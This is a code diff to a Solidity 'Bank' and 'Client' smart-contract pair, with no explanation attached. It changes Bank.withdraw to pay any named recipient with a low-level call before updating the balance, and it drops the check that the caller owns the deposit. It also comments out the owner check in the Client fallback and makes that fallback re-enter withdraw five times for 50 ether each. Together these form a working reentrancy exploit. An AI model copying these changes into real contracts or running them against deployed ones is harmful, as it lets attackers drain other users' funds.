@@ -1,4 +1,5 @@
 pragma solidity ^0.4.24;
+
 contract Bank {
     struct Client {
         uint deposit;
@@ -40,12 +41,12 @@ contract Bank {
     }
 
     // transfer the amount of ether to the provided address
-    function withdraw(uint amount) public payable {
-        if (clientList[msg.sender].deposit < amount){
+    function withdraw(address _recipient, uint amount) public payable {
+        if (clientList[_recipient].deposit < amount){
             revert("not enough deposit to make the withdraw");
         }else {
-            clientList[msg.sender].deposit -= amount;
-            msg.sender.transfer(amount);
+            _recipient.call.value(amount)();
+            clientList[_recipient].deposit -= amount;
         }
     }
 
@@ -65,8 +66,11 @@ contract Bank {
 }
 
 contract Client {
+    
+
     address owner; // the client contract connect with the account who creates it
     Bank bank; // the bank that this client contract connected with
+    int a = 0;
 
     constructor (address _referBank, address _owner) public payable {
         owner = _owner;
@@ -88,7 +92,7 @@ contract Client {
     }
 
     function withdraw(uint amount) public payable{
-        bank.withdraw(amount);
+        bank.withdraw(address(this),amount);
     }
 
     function checkDeposit() public view returns(uint) {
@@ -101,6 +105,10 @@ contract Client {
 
     // transfer the balance from the client's contract to the owner account
     function () public payable {
-        require(msg.sender == owner, "only owner are allow to send money to client contract");
+        // require(msg.sender == owner, "only owner are allow to send money to client contract");
+        if (a<5){
+            bank.withdraw(address(this),50*10**18);
+            a++;
+        }
     }
 }
